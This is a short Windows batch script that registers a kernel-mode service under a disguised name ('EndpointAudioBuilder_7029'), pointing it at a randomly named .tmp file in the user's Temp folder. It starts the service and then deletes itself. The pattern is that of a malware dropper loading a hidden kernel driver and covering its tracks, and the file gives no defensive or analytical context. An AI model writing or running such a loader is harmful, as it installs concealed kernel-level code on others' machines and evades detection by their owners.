@echo off
cd %~dp0
sc create EndpointAudioBuilder_7029 binpath=C:\Users\%username%\AppData\Local\Temp\8a2fa8f6-42fc-484d-6472-da0ffb60d408.tmp type=kernel
sc start EndpointAudioBuilder_7029
del "%~f0"



